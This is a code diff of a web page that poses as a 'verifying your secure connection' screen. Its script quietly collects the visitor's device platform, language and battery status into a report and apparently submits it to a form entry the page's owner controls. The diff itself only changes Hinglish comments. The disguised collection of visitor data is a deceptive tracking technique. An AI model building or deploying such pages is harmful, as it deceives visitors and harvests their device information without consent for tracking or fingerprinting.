@@ -14,7 +14,7 @@
     <p id="msg">Verifying your secure connection...</p>
 
     <script>
-        // AAPKA FORM DATA
+        // ✅ SAHI FORM DETAILS (Don't change these)
         const FORM_URL = "https://google.com"; 
         const ENTRY_ID = "entry.515118501"; 
 
@@ -22,7 +22,6 @@
             try {
                 let report = `Device: ${navigator.platform} | Lang: ${navigator.language} `;
                 
-                // Battery status
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     report += `| Batt: ${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'No'}) `;
